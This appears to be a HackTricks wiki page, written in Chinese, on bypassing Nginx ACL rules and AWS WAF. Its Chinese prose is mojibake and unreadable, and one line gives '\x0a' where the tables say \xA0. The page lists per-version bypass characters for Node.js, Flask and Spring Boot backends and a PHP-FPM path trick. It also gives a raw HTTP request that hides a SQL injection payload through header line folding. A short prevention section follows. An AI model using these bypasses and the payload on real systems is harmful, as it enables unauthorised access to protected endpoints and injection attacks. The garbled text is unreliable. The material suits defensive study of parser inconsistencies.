# ä»£ç† / WAF ä¿æŠ¤ç»•è¿‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## ç»•è¿‡ Nginx ACL è§„åˆ™ <a href="#heading-bypassing-nginx-acl-rules-with-nodejs" id="heading-bypassing-nginx-acl-rules-with-nodejs"></a>

Nginx é™åˆ¶ç¤ºä¾‹ï¼š
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
### NodeJS

<figure><img src="../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

* ç”±äºNginxå°†å­—ç¬¦`\xa0`åŒ…å«åœ¨è·¯å¾„åä¸­ï¼Œå› æ­¤ä¸ä¼šè§¦å‘å¯¹`/admin` URIçš„ACLè§„åˆ™ã€‚ç»“æœï¼ŒNginxå°†HTTPæ¶ˆæ¯è½¬å‘åˆ°åç«¯ï¼›
* å½“Node.jsæœåŠ¡å™¨æ”¶åˆ°URI `/admin\x0a`æ—¶ï¼Œå°†åˆ é™¤å­—ç¬¦`\xa0`ï¼Œå…è®¸æˆåŠŸæ£€ç´¢`/admin`ç«¯ç‚¹ã€‚

| Nginxç‰ˆæœ¬ | **Node.jsç»•è¿‡å­—ç¬¦** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### Flask

Flaskä¼šä»URLè·¯å¾„ä¸­ç§»é™¤å­—ç¬¦`\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`å’Œ`\x09`ï¼Œä½†NGINXä¸ä¼šã€‚

<figure><img src="../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

| Nginxç‰ˆæœ¬ | **Flaskç»•è¿‡å­—ç¬¦**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### Spring Boot <a href="#heading-bypassing-nginx-acl-rules-with-spring-boot" id="heading-bypassing-nginx-acl-rules-with-spring-boot"></a>

ä»¥ä¸‹æ˜¯é€šè¿‡åœ¨è·¯å¾„åæœ«å°¾æ·»åŠ å­—ç¬¦`\x09`æˆ–çš„ACLä¿æŠ¤ç»•è¿‡æ¼”ç¤ºï¼š

<figure><img src="../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

| Nginxç‰ˆæœ¬ | **Spring Bootç»•è¿‡å­—ç¬¦** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### PHP-FPM <a href="#heading-bypassing-nginx-acl-rules-with-php-fpm-integration" id="heading-bypassing-nginx-acl-rules-with-php-fpm-integration"></a>

è€ƒè™‘ä»¥ä¸‹Nginx FPMé…ç½®ï¼š
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
å¯ä»¥é€šè¿‡è®¿é—® `/admin.php/index.php` æ¥ç»•è¿‡å®ƒï¼š

<figure><img src="../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

### å¦‚ä½•é˜²æ­¢ <a href="#heading-how-to-prevent" id="heading-how-to-prevent"></a>

ä¸ºäº†é˜²æ­¢è¿™äº›é—®é¢˜ï¼Œä½ å¿…é¡»åœ¨ Nginx ACL è§„åˆ™ä¸­ä½¿ç”¨ `~` è¡¨è¾¾å¼è€Œä¸æ˜¯ `=` è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼š

COPYCOPY
```plaintext
location ~* ^/admin {
deny all;
}
```
## ç»•è¿‡ AWS WAF ACL çš„è¡ŒæŠ˜å æŠ€æœ¯ <a href="#heading-bypassing-aws-waf-acl-with-line-folding" id="heading-bypassing-aws-waf-acl-with-line-folding"></a>

é€šè¿‡ä½¿ç”¨ä»¥ä¸‹è¯­æ³•ï¼Œå¯ä»¥åœ¨HTTPå¤´ä¸­ç»•è¿‡AWS WAFä¿æŠ¤ï¼ŒAWS WAFå°†æ— æ³•ç†è§£X-Queryå¤´åŒ…å«çš„æ˜¯sqlæ³¨å…¥è´Ÿè½½ï¼Œè€Œåé¢çš„nodeæœåŠ¡å™¨å´èƒ½ç†è§£ï¼š
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
## å‚è€ƒèµ„æ–™

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
